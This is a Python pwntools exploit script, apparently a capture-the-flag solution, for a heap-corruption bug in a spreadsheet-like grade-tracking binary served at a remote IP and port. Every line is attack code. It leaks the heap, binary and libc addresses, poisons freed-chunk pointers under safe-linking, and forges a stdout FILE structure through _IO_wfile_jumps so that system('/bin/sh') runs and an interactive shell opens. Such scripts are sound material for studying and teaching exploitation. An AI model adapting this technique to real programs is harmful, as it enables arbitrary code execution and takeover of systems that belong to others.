#!/bin/env python3
from pwn import *

if len(sys.argv) == 1:
    s = process('./chall', aslr=False)
else:
    s = remote('65.109.204.145', 5003)

def set0(index, z=0):
    x, y = index // 8, index % 8
    s.sendlineafter(b'> ', b'set-grade %d %d %d' % (x, y, z))

def set1(index, content):
    x, y = index // 8, index % 8
    s.sendlineafter(b'> ', b'set-grade %d %d "%b' % (x, y, content))

def set2(index, target, c=0, d=0, e=0):
    x, y = index // 8, index % 8
    a, b = target // 8, target % 8
    s.sendlineafter(b'> ', b'set-grade %d %d =IF(%d:%d > %d,%d,%d)' % (x, y, a, b, c, d, e))

def show():
    s.sendlineafter(b'> ', b'show-grades')
    s.recvuntil(b'Grades:\n')
    res = []
    for i in range(8):
        line = s.recvline(False)
        res += list(filter(lambda x: x != b'', line.split(b' ')))
    return res

def p64x(x):
    return p64(x).replace(b'\0', b'\\\0')

def protect_ptr(pos, ptr):
    return (pos >> 12) ^ ptr

set1(0, b'A')
set1(0, b'A')
set1(1, b'')

heap_base = u64(show()[1].ljust(8, b'\0')) << 12
log.info('heap base: %#x' % heap_base)

set2(51, 50)
set1(2, b'A')
set1(2, b'A')
set1(1, b'A' * 0x27)
set1(0, b'A' * 0x16 + b'\\\0\\\0' + p64x(0x21) + p64x(protect_ptr(heap_base + 0x2c0, heap_base + 0x2e0)))

set1(3, b'A')
set1(4, b'')

elf = ELF('./chall')
libc = ELF('./libc.so.6')

elf.address = u64(show()[4].ljust(8, b'\0')) - 0x4380
log.info('text base: %#x' % elf.address)

set0(4)
set0(2)
set0(3)
set0(0)
set1(5, b'A' * 0x16 + b'\\\0\\\0' + p64x(0x21) + p64x(protect_ptr(heap_base + 0x2c0, elf.symbols['stderr'])))

set1(6, b'A')
set1(7, b'')
set1(50, b'A' * 0x27)
set0(51)

libc.address = u64(show()[7].ljust(8, b'\0')) - libc.symbols['_IO_2_1_stderr_']
log.info('libc base: %#x' % libc.address)

set0(2)

set1(2, b'A' * 0x47)
set0(2)
set1(51, b'A' * 0x1f7)
wide_data = b''
wide_data += b'A' * 0x38
wide_data += p64x(0)
wide_data += p64x(heap_base + 0x100)
wide_data += p64x(0) * 0x17
wide_data += p64x(heap_base + 0x3a0 + 0xe8 - 0x68)
wide_data += p64x(libc.symbols['system'])

set1(2, wide_data)
wide_data_addr = heap_base + 0x3a0

set1(0, b'A')
set0(0)
set0(6)
set0(5)
set1(0, b'A' * 0x16 + b'\\\0\\\0' + p64x(0x21) + p64x(protect_ptr(heap_base + 0x2c0, libc.symbols['_IO_2_1_stdout_'])))
set1(3, b'A')

payload = b''
payload += b'  /bin/sh'
payload += b'\\\0' * 7
payload += p64x(libc.address + 0x21b800) * 7
payload += p64x(0) * 4
payload += p64x(libc.address + 0x21aaa0)
payload += p64x(1)
payload += p64x(0xffffffffffffffff)
payload += p64x(0)
payload += p64x(libc.address + 0x21ca70)
payload += p64x(0xffffffffffffffff)
payload += p64x(0)
payload += p64x(wide_data_addr)
payload += p64x(0) * 3
payload += p64x(0xffffffff)
payload += p64x(0) * 2
payload += p64x(libc.symbols['_IO_wfile_jumps'])

set1(4, payload)
s.sendline('yes')

s.interactive()
